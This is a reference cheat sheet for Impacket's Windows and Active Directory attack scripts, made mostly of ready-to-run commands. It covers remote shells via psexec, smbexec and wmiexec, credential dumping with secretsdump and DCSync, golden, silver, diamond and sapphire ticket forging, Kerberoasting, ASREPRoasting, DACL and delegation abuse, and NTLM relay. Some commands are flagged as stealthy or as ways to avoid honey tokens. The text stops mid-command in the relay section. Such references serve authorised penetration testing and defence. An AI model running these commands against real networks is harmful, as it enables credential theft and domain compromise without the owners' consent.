# Impacket Comprehensive Reference


> Complete reference for all 68 Impacket example scripts, documented from source code at [github.com/fortra/impacket](https://github.com/fortra/impacket).
>
> **Version**: 0.14.0-dev (master branch)

---

## Table of Contents

- [Common Authentication Options](#common-authentication-options)
- [Remote Execution](#remote-execution)
- [Credential Dumping](#credential-dumping)
- [Kerberos](#kerberos)
- [Active Directory Enumeration](#active-directory-enumeration)
- [Active Directory Manipulation](#active-directory-manipulation)
- [SMB Tools](#smb-tools)
- [MSSQL Tools](#mssql-tools)
- [NTLM Relay](#ntlm-relay)
- [RPC Tools](#rpc-tools)
- [WMI Tools](#wmi-tools)
- [DCOM Tools](#dcom-tools)
- [Windows Administration](#windows-administration)
- [DPAPI](#dpapi)
- [Exchange](#exchange)
- [Network Utilities](#network-utilities)
- [File & Registry Utilities](#file--registry-utilities)

---

## Common Authentication Options

Most Impacket tools share these authentication flags:

```
Target format:  [[domain/]username[:password]@]<targetName or address>

-hashes LMHASH:NTHASH     NTLM hash (format LM:NT or :NT)
-no-pass                   Don't ask for password (useful with -k)
-k                         Use Kerberos authentication (requires valid ccache via KRB5CCNAME)
-aesKey AESKEY             AES key to use for Kerberos auth (128 or 256 bits)
-keytab KEYTAB             Keytab file for Kerberos auth
-dc-ip IP                  IP of the domain controller
-target-ip IP              IP address of the target (useful when target is a hostname)
-ts                        Add timestamp to every log line
-debug                     Enable debug output
```

### Kerberos Usage Pattern

```bash
# Get a TGT first
export KRB5CCNAME=/path/to/ticket.ccache

# Then use -k -no-pass with any tool
secretsdump.py -k -no-pass <domain>/<user>@<dc_fqdn>
```

---

## Remote Execution

### psexec.py

PSEXEC-like functionality using RemComSvc. Creates a service on the target, uploads an executable, and provides an interactive shell.

```bash
# Basic usage - interactive SYSTEM shell
psexec.py <domain>/<user>:<password>@<ip>

# With hash
psexec.py -hashes :<nthash> <domain>/<user>@<ip>

# Upload and execute a file
psexec.py <domain>/<user>:<password>@<ip> -c /path/to/local/file.exe

# Execute specific command (non-interactive)
psexec.py <domain>/<user>:<password>@<ip> "ipconfig /all"

# With Kerberos
psexec.py -k -no-pass <domain>/<user>@<target_fqdn>
```

| Argument | Description |
|----------|-------------|
| `-c pathname` | Copy the file to the target and execute it |
| `-path PATH` | Path on remote host where to upload the file (default: temp dir) |
| `-file FILE` | Alternative RemComSvc binary to upload |
| `-codec CODEC` | Character encoding for output (default: utf-8) |
| `-service-name NAME` | Name of the service to create on target |
| `-remote-binary-name NAME` | Name to use for the uploaded binary |
| `-port PORT` | Destination port to connect to SMB server |

---

### smbexec.py

Semi-interactive shell via SMB using a temporary service. No binary uploaded to disk.

```bash
# Basic usage
smbexec.py <domain>/<user>:<password>@<ip>

# With hash
smbexec.py -hashes :<nthash> <domain>/<user>@<ip>

# Specify share and shell type
smbexec.py <domain>/<user>:<password>@<ip> -share C$ -shell-type cmd
```

| Argument | Description |
|----------|-------------|
| `-share SHARE` | Share to use for command output (default: C$) |
| `-mode {SHARE,SERVER}` | Output mode: write to SHARE or start local SMB SERVER |
| `-shell-type {cmd,powershell}` | Shell type to use |
| `-codec CODEC` | Output character encoding |
| `-service-name NAME` | Name of the service to create |

---

### wmiexec.py

Semi-interactive shell using Windows Management Instrumentation (WMI/DCOM).

```bash
# Basic usage
wmiexec.py <domain>/<user>:<password>@<ip>

# With hash
wmiexec.py -hashes :<nthash> <domain>/<user>@<ip>

# Execute single command
wmiexec.py <domain>/<user>:<password>@<ip> "whoami"

# PowerShell shell
wmiexec.py <domain>/<user>:<password>@<ip> -shell-type powershell

# No output (blind execution)
wmiexec.py <domain>/<user>:<password>@<ip> -nooutput "command"
```

| Argument | Description |
|----------|-------------|
| `-share SHARE` | Share to use for output (default: ADMIN$) |
| `-nooutput` | Don't try to retrieve command output |
| `-shell-type {cmd,powershell}` | Shell type to use |
| `-codec CODEC` | Output character encoding |
| `-silentcommand` | Don't display command output |
| `-com-version MAJOR:MINOR` | DCOM version (default: 5.7) |

---

### dcomexec.py

Semi-interactive shell via DCOM objects (MMC20.Application, ShellWindows, ShellBrowserWindow).

```bash
# Basic usage (default: MMC20)
dcomexec.py <domain>/<user>:<password>@<ip>

# Using ShellWindows object
dcomexec.py <domain>/<user>:<password>@<ip> -object ShellWindows

# Using ShellBrowserWindow
dcomexec.py <domain>/<user>:<password>@<ip> -object ShellBrowserWindow

# Execute command
dcomexec.py <domain>/<user>:<password>@<ip> "ipconfig"
```

| Argument | Description |
|----------|-------------|
| `-share SHARE` | Share for output (default: ADMIN$) |
| `-nooutput` | Don't retrieve output |
| `-object {ShellWindows,ShellBrowserWindow,MMC20}` | DCOM object to use |
| `-shell-type {cmd,powershell}` | Shell type |
| `-silentcommand` | Suppress command output |

---

### atexec.py

Execute commands via the Windows Task Scheduler service (ATSVC).

```bash
# Execute command
atexec.py <domain>/<user>:<password>@<ip> "whoami"

# With hash
atexec.py -hashes :<nthash> <domain>/<user>@<ip> "ipconfig"

# Silent (no output retrieval)
atexec.py <domain>/<user>:<password>@<ip> -silentcommand "command"
```

| Argument | Description |
|----------|-------------|
| `-session-id ID` | Session ID for logon type |
| `-silentcommand` | Don't fetch output |
| `-codec CODEC` | Output encoding |

---

## Credential Dumping

### secretsdump.py

Dump secrets remotely using multiple techniques: SAM/LSA via registry, NTDS.dit via DRSUAPI (DCSync) or VSS, and cached credentials.

```bash
# Remote dump (all secrets - SAM, LSA, NTDS via DRSUAPI)
secretsdump.py <domain>/<user>:<password>@<ip>

# DCSync specific user
secretsdump.py -just-dc-user Administrator <domain>/<user>:<password>@<dc_ip>

# DCSync NTLM hashes only (no Kerberos keys)
secretsdump.py -just-dc-ntlm <domain>/<user>:<password>@<dc_ip>

# DCSync entire domain
secretsdump.py -just-dc <domain>/<user>:<password>@<dc_ip>

# With hash
secretsdump.py -hashes :<nthash> <domain>/<user>@<ip>

# Using VSS shadow copy method
secretsdump.py -use-vss <domain>/<user>:<password>@<dc_ip>

# Parse offline NTDS.dit + SYSTEM hive
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# Parse offline SAM + SYSTEM hive
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Parse offline SECURITY + SYSTEM hive
secretsdump.py -security SECURITY -system SYSTEM LOCAL

# Output to file
secretsdump.py -outputfile dump <domain>/<user>:<password>@<ip>

# Include password last set time and user status
secretsdump.py -pwd-last-set -user-status <domain>/<user>:<password>@<dc_ip>

# Include history
secretsdump.py -history <domain>/<user>:<password>@<ip>

# Skip SAM/SECURITY for speed (DC only - NTDS)
secretsdump.py -skip-sam -skip-security <domain>/<user>:<password>@<dc_ip>

# DCSync with LDAP filter
secretsdump.py -just-dc -ldapfilter '(sAMAccountName=admin*)' <domain>/<user>:<password>@<dc>

# Skip specific user
secretsdump.py -just-dc -skip-user krbtgt <domain>/<user>:<password>@<dc>

# Using Key List attack (RODC)
secretsdump.py -use-keylist -rodcNo <number> -rodcKey <aes_key> <domain>/<user>:<password>@<dc>

# Choose exec method for remote registry
secretsdump.py -exec-method wmiexec <domain>/<user>:<password>@<ip>
```

---

### regsecrets.py

Dump secrets from remote registry using direct registry reads (alternative to secretsdump's approach).

```bash
# Basic dump
regsecrets.py <domain>/<user>:<password>@<ip>

# Skip specific hives
regsecrets.py -nosam -nocache <domain>/<user>:<password>@<ip>

# With throttle (slower, stealthier)
regsecrets.py -throttle 0.5 <domain>/<user>:<password>@<ip>

# With output file and history
regsecrets.py -outputfile dump -history <domain>/<user>:<password>@<ip>
```

| Argument | Description |
|----------|-------------|
| `-nosam` | Do NOT dump SAM hashes |
| `-nocache` | Do NOT dump cached domain logon credentials |
| `-nolsa` | Do NOT dump LSA secrets |
| `-throttle SECONDS` | Delay between registry reads |
| `-history` | Include password history |

---

## Kerberos

### getTGT.py


Request a TGT (Ticket Granting Ticket) and save it to a ccache file.

```bash
# With password
getTGT.py <domain>/<user>:<password>

# With NT hash
getTGT.py <domain>/<user> -hashes :<nthash>

# With AES key
getTGT.py <domain>/<user> -aesKey <aes256_key>

# Specify DC
getTGT.py -dc-ip <dc_ip> <domain>/<user>:<password>

# Request for specific service (not krbtgt)
getTGT.py <domain>/<user>:<password> -service <SPN>
```

| Argument | Description |
|----------|-------------|
| `-service SPN` | Request TGT for specific service instead of krbtgt |
| `-principalType TYPE` | Kerberos principal type (default: NT_PRINCIPAL) |

---

### getST.py

Request a Service Ticket (TGS). Supports S4U2Self, S4U2Proxy, U2U, and standard TGS-REQ.

```bash
# Standard service ticket request
getST.py -spn cifs/<target> <domain>/<user>:<password>

# S4U2Proxy - impersonate user to a service (constrained delegation)
getST.py -spn cifs/<target> -impersonate Administrator <domain>/<user>:<password>

# S4U2Proxy with alternative service names
getST.py -spn cifs/<target> -impersonate Administrator \
  -altservice host,http,ldap <domain>/<user>:<password>

# S4U2Self (get ticket as another user for yourself)
getST.py -self -impersonate Administrator -altservice cifs/<target> \
  -k -no-pass <domain>/<machine>$

# S4U2Proxy with additional ticket (constrained delegation without protocol transition)
getST.py -spn cifs/<target> -impersonate Administrator \
  -additional-ticket <ticket.ccache> <domain>/<user>:<password>

# Force forwardable flag
getST.py -spn cifs/<target> -impersonate Administrator \
  -force-forwardable <domain>/<user>:<password>

# U2U (User-to-User) authentication
getST.py -u2u -impersonate Administrator -spn cifs/<target> \
  <domain>/<user>:<password>

# Renew ticket
getST.py -renew -k -no-pass <domain>/<user>

# dMSA abuse
getST.py -dmsa <dMSA_name> -impersonate Administrator \
  -spn cifs/<target> <domain>/<user>:<password>

# With hash
getST.py -spn cifs/<target> -impersonate Admin \
  -hashes :<nthash> <domain>/<user>
```

| Argument | Description |
|----------|-------------|
| `-spn SPN` | Service Principal Name to request ticket for |
| `-impersonate USER` | User to impersonate via S4U |
| `-altservice SERVICE` | Alternative service(s) for the ticket (comma-separated) |
| `-additional-ticket FILE` | Additional ticket for S4U2Proxy |
| `-self` | Perform S4U2Self only |
| `-force-forwardable` | Force forwardable flag on S4U2Self ticket |
| `-u2u` | Use User-to-User authentication |
| `-renew` | Renew existing ticket |
| `-dmsa NAME` | Exploit dMSA for impersonation |

---

### ticketer.py

Create Kerberos Golden, Silver, Diamond, and Sapphire tickets.

```bash
# Golden ticket (with krbtgt hash)
ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain <domain> <username>

# Golden ticket (with AES key)
ticketer.py -aesKey <krbtgt_aes256> -domain-sid <sid> -domain <domain> <username>

# Silver ticket (with machine hash)
ticketer.py -nthash <machine_hash> -domain-sid <sid> \
  -domain <domain> -spn cifs/<target> <username>

# Diamond ticket (modify legitimate TGT)
ticketer.py -request -domain <domain> -user <user> -password <password> \
  -nthash <krbtgt_hash> -aesKey <aes> -domain-sid <sid> \
  -user-id <uid> -groups '512,513,518,519,520' <target_user>

# Sapphire ticket (stealthiest)
ticketer.py -request -impersonate <target_user> -domain <domain> \
  -user <user> -password <password> -nthash <hash> \
  -aesKey <aes> -domain-sid <sid> 'ignored'

# With extra SIDs (cross-trust, Enterprise Admins)
ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> \
  -domain <child_domain> -extra-sid <parent_sid>-519 <username>

# Custom groups
ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain> \
  -groups '512,513,518,519,520' -user-id 500 <username>

# Custom duration
ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain> \
  -duration <hours> <username>

# With extra PAC
ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain> \
  -extra-pac <pac_file> <username>
```

| Argument | Description |
|----------|-------------|
| `-spn SPN` | SPN for Silver ticket |
| `-request` | Request a legitimate ticket to modify (Diamond/Sapphire) |
| `-impersonate USER` | User to impersonate (Sapphire ticket) |
| `-domain DOMAIN` | Target domain FQDN |
| `-domain-sid SID` | Domain SID |
| `-nthash HASH` | krbtgt or machine NT hash |
| `-aesKey KEY` | AES key (128 or 256) |
| `-groups GROUPS` | Comma-separated group IDs for PAC |
| `-user-id UID` | User ID for the ticket |
| `-extra-sid SID` | Extra SIDs to add (comma-separated) |
| `-extra-pac FILE` | Extra PAC to include |
| `-old-pac FILE` | Old PAC for Diamond ticket |
| `-duration HOURS` | Ticket duration in hours |

---

### ticketConverter.py

Convert between Kerberos ticket formats (kirbi <-> ccache).

```bash
# Convert kirbi to ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Convert ccache to kirbi
ticketConverter.py ticket.ccache ticket.kirbi

# Base64 input
ticketConverter.py -b <base64_ticket> ticket.ccache
```

---

### describeTicket.py

Parse and display the contents of a Kerberos ticket, decrypt enc-part, and parse PAC.

```bash
# Describe a ticket (ccache or kirbi)
describeTicket.py <ticket_file>

# Decrypt with password
describeTicket.py <ticket_file> -p <password> -u <user> -d <domain>

# Decrypt with AES key
describeTicket.py <ticket_file> --aes <aes_key>

# Decrypt with RC4/NT hash
describeTicket.py <ticket_file> --rc4 <nt_hash>
```

---

### GetNPUsers.py

ASREPRoast - find and exploit users without Kerberos pre-authentication.

```bash
# Enumerate ASREPRoastable users (with creds)
GetNPUsers.py <domain>/<user>:<password> -dc-ip <dc_ip>

# Request AS-REP hashes from user list (no creds needed)
GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Request for specific user
GetNPUsers.py <domain>/<user> -no-pass -dc-ip <dc_ip>

# With hash
GetNPUsers.py -hashes :<nthash> <domain>/<user>

# Request all (authenticated)
GetNPUsers.py <domain>/<user>:<password> -request -format hashcat -outputfile hashes.txt
```

| Argument | Description |
|----------|-------------|
| `-request` | Request TGT for vulnerable users |
| `-format {hashcat,john}` | Output format for cracking |
| `-outputfile FILE` | Write hashes to file |
| `-usersfile FILE` | File with usernames (one per line) |

---

### GetUserSPNs.py

Kerberoasting - find service accounts and request TGS tickets for cracking.

```bash
# Enumerate SPNs
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc_ip>

# Request TGS hashes
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>

# Request for specific user
GetUserSPNs.py -request-user <target_user> <domain>/<user>:<password>

# Request machine account SPNs only
GetUserSPNs.py -request-machine <domain>/<user>:<password>

# Output to file
GetUserSPNs.py -request -outputfile kerberoast.txt <domain>/<user>:<password>

# Save tickets as ccache files
GetUserSPNs.py -request -save <domain>/<user>:<password>

# Stealth mode (avoid honey token detection)
GetUserSPNs.py -request -stealth <domain>/<user>:<password>

# Machine accounts only
GetUserSPNs.py -request -machine-only <domain>/<user>:<password>

# Kerberoast without pre-auth (via ASREPRoastable user)
GetUserSPNs.py -no-preauth <asrep_user> -usersfile users.txt \
  -dc-host <dc_ip> <domain>/

# Target another domain
GetUserSPNs.py -target-domain <other_domain> <domain>/<user>:<password>

# With hash
GetUserSPNs.py -hashes :<nthash> -request <domain>/<user>
```

| Argument | Description |
|----------|-------------|
| `-request` | Request TGS for found SPNs |
| `-request-user USER` | Request TGS for specific user |
| `-request-machine` | Request TGS for machine accounts |
| `-save` | Save tickets as ccache files |
| `-outputfile FILE` | Write hashes to file |
| `-stealth` | Stealth mode (avoids honey tokens) |
| `-machine-only` | Only enumerate machine accounts |
| `-no-preauth USER` | Use ASREPRoastable user for Kerberoasting |
| `-usersfile FILE` | Users file for no-preauth mode |
| `-target-domain DOMAIN` | Target a different domain |

---

### getPac.py

Request and parse a user's PAC (Privilege Attribute Certificate).


```bash
getPac.py -targetUser <user> <domain>/<requesting_user>:<password>

# With hash
getPac.py -targetUser <user> -hashes :<nthash> <domain>/<requesting_user>
```

---

### keylistattack.py

KERB-KEY-LIST-REQ attack to dump credentials via a compromised RODC.

```bash
keylistattack.py <domain>/<user>:<password>@<kdc_ip> \
  -rodcNo <rodc_number> -rodcKey <aes_key>

# Target specific user
keylistattack.py <domain>/<user>:<password>@<kdc_ip> \
  -rodcNo <number> -rodcKey <key> -t <target_user>

# Target users from file
keylistattack.py <domain>/<user>:<password>@<kdc_ip> \
  -rodcNo <number> -rodcKey <key> -tf targets.txt

# Full dump
keylistattack.py <domain>/<user>:<password>@<kdc_ip> \
  -rodcNo <number> -rodcKey <key> -full
```

---

## Active Directory Enumeration

### GetADUsers.py

Query domain for user information.

```bash
# All users
GetADUsers.py -all -dc-ip <dc_ip> <domain>/<user>:<password>

# Specific user
GetADUsers.py -user <target_user> <domain>/<user>:<password>
```

---

### GetADComputers.py

Query domain for computer account information.


```bash
# All computers
GetADComputers.py -dc-ip <dc_ip> <domain>/<user>:<password>

# Resolve IPs
GetADComputers.py -resolveIP <domain>/<user>:<password>

# Specific computer
GetADComputers.py -user <computer$> <domain>/<user>:<password>
```

---

### GetLAPSPassword.py

Extract LAPS passwords from LDAP.

```bash
# All LAPS passwords
GetLAPSPassword.py -dc-ip <dc_ip> <domain>/<user>:<password>

# Specific computer
GetLAPSPassword.py -computer <name> <domain>/<user>:<password>

# Use LDAPS
GetLAPSPassword.py -ldaps <domain>/<user>:<password>

# Output to file
GetLAPSPassword.py -outputfile laps.txt <domain>/<user>:<password>
```

---

### findDelegation.py

Find all delegation relationships in the domain.

```bash
# Find all delegation
findDelegation.py <domain>/<user>:<password>

# Target specific domain
findDelegation.py -target-domain <other_domain> <domain>/<user>:<password>

# Filter specific user
findDelegation.py -user <user> <domain>/<user>:<password>

# Include disabled accounts
findDelegation.py -disabled <domain>/<user>:<password>
```

---

### lookupsid.py

SID brute forcing / SID lookup.

```bash
# Enumerate SIDs (users, groups, etc.)
lookupsid.py <domain>/<user>:<password>@<ip> <max_rid>

# Get domain SIDs
lookupsid.py -domain-sids <domain>/<user>:<password>@<ip> 0

# With hash
lookupsid.py -hashes :<nthash> <domain>/<user>@<ip> 20000
```

| Argument | Description |
|----------|-------------|
| `max_rid` | Maximum RID to brute force (positional arg) |
| `-domain-sids` | Enumerate domain SIDs |

---

### samrdump.py

Enumerate users via SAMR (Security Account Manager Remote).

```bash
# Dump users
samrdump.py <domain>/<user>:<password>@<ip>

# CSV output
samrdump.py -csv <domain>/<user>:<password>@<ip>
```

---

### CheckLDAPStatus.py

Check LDAP signing and channel binding configuration.

```bash
CheckLDAPStatus.py -dc-ip <dc_ip> -domain <domain>

# With timeout
CheckLDAPStatus.py -dc-ip <dc_ip> -domain <domain> -timeout 10
```

---

### DumpNTLMInfo.py

Dump NTLM authentication information from a target.

```bash
DumpNTLMInfo.py <target_ip>

# Specific port/protocol
DumpNTLMInfo.py <target_ip> -port 445 -protocol SMB
```

---

### netview.py

Enumerate hosts, sessions, and logged-on users on the network.

```bash
netview.py <domain>/<user>:<password>

# Target specific hosts
netview.py -target <ip> <domain>/<user>:<password>
netview.py -targets hosts.txt <domain>/<user>:<password>

# Filter by group
netview.py -group "Domain Admins" <domain>/<user>:<password>

# Single pass (no loop)
netview.py -noloop <domain>/<user>:<password>
```

---

## Active Directory Manipulation

### addcomputer.py

Add or delete computer accounts in the domain.

```bash
# Add computer account
addcomputer.py -computer-name 'NEWPC$' -computer-pass 'Password123' \
  -dc-host <dc> -domain-netbios <DOMAIN> <domain>/<user>:<password>

# Delete computer account
addcomputer.py -computer-name 'NEWPC$' -delete \
  <domain>/<user>:<password>

# Using LDAP method (default: SAMR)
addcomputer.py -method LDAPS -computer-name 'NEWPC$' \
  -computer-pass 'Password123' <domain>/<user>:<password>

# Specify computer group
addcomputer.py -computer-name 'NEWPC$' -computer-pass 'Pass123' \
  -computer-group 'CN=Computers,DC=domain,DC=local' <domain>/<user>:<password>
```

| Argument | Description |
|----------|-------------|
| `-computer-name NAME` | Computer account name to add |
| `-computer-pass PASS` | Password for the computer account |
| `-no-add` | Don't add, just set password |
| `-delete` | Delete the computer account |
| `-method {SAMR,LDAPS}` | Method to use (default: SAMR) |
| `-computer-group DN` | DN of the group for the computer |
| `-baseDN DN` | Base DN for LDAP operations |

---

### rbcd.py

Manage Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity).

```bash
# Write RBCD delegation
rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' \
  -dc-ip <dc_ip> -action write <domain>/<user>:<password>

# Read current RBCD config
rbcd.py -delegate-to 'TARGET$' -dc-ip <dc_ip> \
  -action read <domain>/<user>:<password>

# Remove RBCD delegation
rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' \
  -dc-ip <dc_ip> -action remove <domain>/<user>:<password>

# Flush all RBCD from target
rbcd.py -delegate-to 'TARGET$' -dc-ip <dc_ip> \
  -action flush <domain>/<user>:<password>

# With hash
rbcd.py -delegate-from 'PC$' -delegate-to 'DC$' -action write \
  -hashes :<nthash> <domain>/<user>
```

| Argument | Description |
|----------|-------------|
| `-delegate-from PRINCIPAL` | Account to delegate FROM |
| `-delegate-to PRINCIPAL` | Account to delegate TO |
| `-action {read,write,remove,flush}` | Action to perform |
| `-use-ldaps` | Use LDAPS instead of LDAP |

---

### dacledit.py

Edit DACLs (Discretionary Access Control Lists) on AD objects.

```bash
# Read ACEs for a principal on target
dacledit.py -principal <user> -target <target> -action read \
  <domain>/<user>:<password>

# Write new ACE (grant DCSync rights)
dacledit.py -principal <user> -target-dn 'DC=domain,DC=local' \
  -action write -rights DCSync <domain>/<user>:<password>

# Grant FullControl
dacledit.py -principal <user> -target <target_user> \
  -action write -rights FullControl <domain>/<user>:<password>

# Remove ACE
dacledit.py -principal <user> -target <target> \
  -action remove -rights DCSync <domain>/<user>:<password>

# Backup ACL to file
dacledit.py -principal <user> -target <target> \
  -action backup -file acl_backup.json <domain>/<user>:<password>

# Restore ACL from file
dacledit.py -principal <user> -target <target> \
  -action restore -file acl_backup.json <domain>/<user>:<password>

# With specific ACE type
dacledit.py -principal <user> -target <target> -action write \
  -ace-type allowed -rights WriteMembers <domain>/<user>:<password>
```

| Argument | Description |
|----------|-------------|
| `-principal NAME` | Principal to add ACE for |
| `-principal-sid SID` | Principal SID (alternative to name) |
| `-target NAME` | Target object |
| `-target-sid SID` | Target SID |
| `-target-dn DN` | Target Distinguished Name |
| `-action {read,write,remove,backup,restore}` | Action to perform |
| `-rights {FullControl,DCSync,WriteMembers,ResetPassword,WriteAccountRestrictions,Self}` | Rights to set |
| `-rights-guid GUID` | Custom rights GUID |
| `-ace-type {allowed,denied}` | ACE type |
| `-inheritance` | Enable inheritance |

---

### owneredit.py

Change the owner of an AD object.

```bash
# Read current owner
owneredit.py -target <object> -action read \
  <domain>/<user>:<password>

# Change owner
owneredit.py -target <object> -new-owner <new_owner> -action write \
  <domain>/<user>:<password>

# Backup and restore
owneredit.py -target <object> -action backup -file owner.json \
  <domain>/<user>:<password>
owneredit.py -target <object> -action restore -file owner.json \
  <domain>/<user>:<password>
```

| Argument | Description |
|----------|-------------|
| `-target NAME` | Target AD object |
| `-new-owner NAME` | New owner principal |
| `-action {read,write,backup,restore}` | Action to perform |

---

### badsuccessor.py

Exploit delegated Managed Service Accounts (dMSA) for privilege escalation.

```bash
# Create a dMSA with permissions to read target account
badsuccessor.py -dmsa-name 'evil_dmsa' -target-account <target> \
  -action create <domain>/<user>:<password>

# Write principals allowed to retrieve password
badsuccessor.py -dmsa-name 'evil_dmsa' \
  -principals-allowed <attacker_user> -action write \
  <domain>/<user>:<password>

# Read dMSA configuration
badsuccessor.py -dmsa-name 'evil_dmsa' -action read \
  <domain>/<user>:<password>

# Delete dMSA
badsuccessor.py -dmsa-name 'evil_dmsa' -action delete \
  <domain>/<user>:<password>
```

| Argument | Description |
|----------|-------------|
| `-dmsa-name NAME` | Name of the dMSA |
| `-action {read,write,create,delete}` | Action to perform |
| `-target-account NAME` | Account to impersonate via dMSA |
| `-target-ou OU` | OU for the dMSA |
| `-principals-allowed NAMES` | Principals allowed to retrieve managed password |
| `-dns-hostname NAME` | DNS hostname for the dMSA |
| `-method {SAMR,LDAPS}` | Method to use |

---

### changepasswd.py

Change or reset user passwords over multiple protocols.

```bash
# Change password (user changes own password)
changepasswd.py <domain>/<user>:<old_password>@<dc_ip> -newpass <new_password>

# Reset password (admin resets another user, requires rights)
changepasswd.py <domain>/<admin>:<password>@<dc_ip> \
  -altuser <target_user> -reset -newpass <new_password>

# Change password with hash
changepasswd.py -hashes :<old_nthash> <domain>/<user>@<dc_ip> \
  -newhashes :<new_nthash>

# Specify protocol
changepasswd.py <domain>/<user>:<password>@<dc_ip> \
  -newpass <new> -protocol kpasswd

# Using admin credentials to reset
changepasswd.py <domain>/<user>@<dc_ip> -altuser <admin> \
  -altpass <admin_pass> -reset -newpass <new_pass> -admin
```

| Argument | Description |
|----------|-------------|
| `-newpass PASSWORD` | New password |
| `-newhashes LM:NT` | New password as hashes |
| `-altuser USER` | Alternative user for authentication |
| `-altpass PASS` | Alternative user's password |
| `-althash HASH` | Alternative user's hash |
| `-protocol {ms-samr,ms-rpc,kpasswd}` | Protocol to use |
| `-reset` | Reset password (requires admin rights) |
| `-admin` | Authenticate as admin for reset |

---

### raiseChild.py

Automated child-to-parent domain privilege escalation.

```bash
# Automatic escalation
raiseChild.py <child_domain>/<user>:<password>

# With DC IP
raiseChild.py -dc-ip <dc_ip> <child_domain>/<user>:<password>

# Execute command on parent DC
raiseChild.py -target-exec <parent_dc_ip> <child_domain>/<user>:<password>

# Specify target RID
raiseChild.py -targetRID 519 <child_domain>/<user>:<password>
```

---

### net.py

SAMR-based user, group, and alias management (similar to Windows `net` command).

```bash
# User operations
net.py <domain>/<user>:<password>@<ip> user                    # List users
net.py <domain>/<user>:<password>@<ip> user -name <user>        # Show user info
net.py <domain>/<user>:<password>@<ip> user -create -name <user> -newPasswd <pass>
net.py <domain>/<user>:<password>@<ip> user -remove -name <user>
net.py <domain>/<user>:<password>@<ip> user -enable -name <user>
net.py <domain>/<user>:<password>@<ip> user -disable -name <user>

# Group operations
net.py <domain>/<user>:<password>@<ip> group                   # List groups
net.py <domain>/<user>:<password>@<ip> group -name <group>      # Show group members
net.py <domain>/<user>:<password>@<ip> group -join -name <group> -member <user>
net.py <domain>/<user>:<password>@<ip> group -unjoin -name <group> -member <user>

# Alias operations (local groups)
net.py <domain>/<user>:<password>@<ip> alias                   # List aliases
net.py <domain>/<user>:<password>@<ip> alias -name <alias>
```

---

### samedit.py

In-place edit of local user passwords in offline SAM hive.

```bash
# Change local user password in SAM hive
samedit.py -system SYSTEM -sam SAM -password <new_password> <username>

# Change with hashes
samedit.py -system SYSTEM -sam SAM -hashes :<new_nthash> <username>

# Using bootkey directly
samedit.py -bootkey <bootkey> -sam SAM -password <new_password> <username>
```

---

## SMB Tools

### smbclient.py

Interactive SMB client (file browser).

```bash
# Connect
smbclient.py <domain>/<user>:<password>@<ip>

# With hash
smbclient.py -hashes :<nthash> <domain>/<user>@<ip>

# Execute commands from file
smbclient.py -inputfile commands.txt <domain>/<user>:<password>@<ip>

# Commands avai
lable in interactive mode:
# shares, use <share>, ls, cd, get, put, mkdir, rmdir, rm, cat, info, etc.
```

---

### smbserver.py

Launch a local SMB server.


```bash
# Basic SMB share
smbserver.py <sharename> <local_path>

# With SMB2 support
smbserver.py <sharename> <local_path> -smb2support

# With authentication
smbserver.py <sharename> <local_path> -username <user> -password <pass>

# Capture hashes to file
smbserver.py <sharename> <local_path> -smb2support -outputfile hashes.txt

# With IP binding
smbserver.py <sharename> <local_path> -ip <listen_ip>

# Read only
smbserver.py <sharename> <local_path> -readonly

# IPv6
smbserver.py <sharename> <local_path> -6
```

---

### karmaSMB.py

SMB server that responds to every file request with a specified file (for poisoning/exploitation).

```bash
karmaSMB.py -config <config_file>

# With SMB2 support
karmaSMB.py -config <config_file> -smb2support
```

---

## MSSQL Tools

### mssqlclient.py

Interactive MSSQL client with TDS protocol support.

```bash
# Windows authentication
mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>

# SQL authentication
mssqlclient.py <user>:<password>@<ip>

# Specific database
mssqlclient.py -db <database> <domain>/<user>:<password>@<ip>

# Execute command on connect
mssqlclient.py <domain>/<user>:<password>@<ip> -command "SELECT @@version"

# Execute SQL from file
mssqlclient.py <domain>/<user>:<password>@<ip> -file queries.sql

# Custom port
mssqlclient.py <domain>/<user>:<password>@<ip> -port 1434

# Interactive commands:
# enable_xp_cmdshell, xp_cmdshell <cmd>, sp_linkedservers,
# enum_db, enum_impersonate, exec_as_login, exec_as_user, use_link
```

| Argument | Description |
|----------|-------------|
| `-db DATABASE` | MSSQL database instance |
| `-windows-auth` | Use Windows authentication |
| `-command CMD` | Execute SQL command |
| `-file FILE` | Execute SQL from file |
| `--host-name NAME` | Hostname for client identification |
| `--app-name NAME` | Application name |
| `-port PORT` | MSSQL port (default: 1433) |

---

### mssqlinstance.py

Discover running MSSQL instances on a host.

```bash
mssqlinstance.py <target_ip>

# With timeout
mssqlinstance.py <target_ip> -timeout 5
```

---

## NTLM Relay

### ntlmrelayx.py

NTLM relay framework. Intercepts NTLM authentication and relays to targets.

```bash
# Relay to SMB targets (from file)
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to specific target
ntlmrelayx.py -t smb://<ip> -smb2support

# Relay to LDAP (add computer + delegate)
ntlmrelayx.py -t ldaps://<dc_ip> -smb2support \
  --add-computer <name> <password> --delegate-access

# Relay to LDAP (shadow credentials)
ntlmrelayx.py -t ldaps://<dc_ip> -smb2support \
  --shadow-credentials --shadow-target '<target$>'

# Relay to LDAP (escalate user to DCSync)
ntlmrelayx.py -t ldaps://<dc_ip> -smb2support --escalate-user <user>

# Relay to LDAP (dump LAPS)
ntlmrelayx.py -t ldaps://<dc_ip> -smb2support --dump-laps

# Relay to LDAP (dump gMSA)
ntlmrelayx.py -t ldaps://<dc_ip> -smb2support --dump-gmsa

# Relay to LDAP (dump ADCS templates)
ntlmrelayx.py -t ldaps://<dc_ip> -smb2support --dump-adcs

# Relay to ADCS web enrollment
ntlmrelayx.py -t http://<ca_ip>/certsrv/certfnsh.asp \
